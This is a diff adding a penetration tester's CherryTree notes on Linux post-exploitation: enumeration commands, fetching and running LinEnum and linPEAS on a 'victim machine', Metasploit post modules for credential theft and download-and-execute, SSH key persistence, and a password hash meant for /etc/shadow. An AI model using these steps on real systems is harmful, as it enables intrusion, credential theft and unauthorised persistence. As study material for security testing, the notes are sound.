@@ -1,0 +1,181 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node name="Linux" unique_id="8" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704069269" ts_lastsave="1704149601">
+    <rich_text underline="single" weight="heavy">enumerating system information</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+
+</rich_text>
+    <rich_text underline="single" weight="heavy">Users and Groups</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text underline="single" weight="heavy">Network Information</rich_text>
+    <rich_text>
+
+what are we looking for?
+
+current IP &amp; NIC 
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+internal networks
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+TCP/UDP services running and respective ports
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+other hosts on the network (cat /etc/hosts)(arp -a)
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+hostname (cat /etc/hostname)
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+Processes and CronJobs
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text underline="single" weight="heavy">Automating</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text link="webs https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text link="webs https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text underline="single" weight="heavy">Post Enumeration with MetaSploit</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+the output of the above will be stored in "loot" and "notes"
+
+searching
+
+
+</rich_text>
+    <rich_text underline="single" weight="heavy">Privelege Escalation Tricks</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+If you find binaries for exploitation reference </rich_text>
+    <rich_text link="webs https://gtfobins.github.io/">https://gtfobins.github.io/</rich_text>
+    <rich_text> 
+
+Good checklists with further information:
+</rich_text>
+    <rich_text link="webs https://book.hacktricks.xyz/linux-hardening/privilege-escalation">https://book.hacktricks.xyz/linux-hardening/privilege-escalation</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text link="webs https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist">https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist</rich_text>
+    <codebox char_offset="31" justification="left" frame_width="576" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hostname #find the hostname
+cat /etc/issue #display OS info
+cat /etc/*release #display specific distribution version
+uname -a #displays kernal version
+uname -r #displays only kernal version
+env #displays environment variables
+lscpu #displays CPU and arch info
+free -h #displays RAM usage
+df -h #displays disk and filesystem information
+df -ht ext4 #only displays the volumes of that filesystem type
+lsblk | grep sd #displays storage devices
+dpkg -l #will display package information (debian / Ubuntu)
+
+sysinfo #meterpreter</codebox>
+    <codebox char_offset="52" justification="left" frame_width="963" frame_height="40" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">#meterpreter
+getuid #(uid=0 is root)
+
+#from bash
+whoami #displays current username
+groups username #displays the groups a user belongs to
+cat /etc/passwd #displays all users and service accounts, home directory, and associated UID
+cat /etc/passwd | grep -v /nologin #displays all users you can log into
+useradd username -s /bin/bash #creates a user and specifies the shell to use, not permitted in most tests
+groups displays groups
+usermod -aG username groupname #adds user to group
+last #displays last users to log into the system
+lastlog #displays list of users to have recently logged into the system</codebox>
+    <codebox char_offset="120" justification="left" frame_width="500" frame_height="70" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ifconfig
+ip a s
+cat /etc/networks
+cat /etc/hosts</codebox>
+    <codebox char_offset="141" justification="left" frame_width="500" frame_height="40" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">route
+cat /etc/resolv.conf</codebox>
+    <codebox char_offset="189" justification="left" frame_width="500" frame_height="40" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">netstat -nao</codebox>
+    <codebox char_offset="243" justification="left" frame_width="500" frame_height="40" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cat /etc/hosts
+arp -a</codebox>
+    <codebox char_offset="274" justification="left" frame_width="500" frame_height="40" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hostname
+cat /etc/hostname</codebox>
+    <codebox char_offset="299" justification="left" frame_width="500" frame_height="40" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crontab -l
+ps #displays running processes
+ps -aux
+top
+ls -al /etc/cron*
+cat /etc/cron*
+
+pgrep #meterpreter - displays running processes</codebox>
+    <codebox char_offset="352" justification="left" frame_width="872" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh --output LinEnum.sh
+
+#from victim machine
+chmod +x ./LinEnum.sh
+./LinEnum.sh</codebox>
+    <codebox char_offset="395" justification="left" frame_width="1306" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh --output linpeas.sh
+
+#To Use from MeterPreter
+sudo wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/metasploit/peass.rb -O /usr/share/metasploit-framework/modules/post/multi/gather/peass.rb
+reload_all #run from metasploit window
+use post/multi/gather/peass</codebox>
+    <codebox char_offset="431" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">post/linux/gather/enum_configs
+post/multi/gather/env
+post/linux/gather/enum_network
+post/linux/gather/enum_system
+post/linux/gather/enum_protections
+post/linux/gather/checkvm
+post/linux/gather/checkcontainer
+post/linux/gather/enum_users_history
+post/multi/manage/system_session
+post/linux/manage/download_exec
+post/multi/gather/peass #if you have configured linpeas
+
+post/multi/gather/ssh_creds
+post/multi/gather/docker_creds
+post/linux/gather/hashdump
+post/linux/gather/ecryptfs_creds
+post/linux/gather/enum_psk
+post/linux/gather/enum_xchat
+post/linux/gather/phpmyadmin_credsteal
+post/linux/gather/pptpd_chap_secrets
+post/linux/manage/sshkey_persistence</codebox>
+    <codebox char_offset="494" justification="left" frame_width="500" frame_height="55" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">post/linux/manage/sshkey_persistence
+chmod 0400 ssh_key
+ssh -i ssh_key root@ip.addr</codebox>
+    <codebox char_offset="506" justification="left" frame_width="500" frame_height="40" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">search platform:linux name:persistence</codebox>
+    <codebox char_offset="537" justification="left" frame_width="850" frame_height="40" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">find / -not -type l -perm -o+w # finds all files editable by anyone
+openssl passwd -1 -salt abc password #generates a hash of the password password to write in /etc/shadow	</codebox>
+  </node>
+</cherrytree>
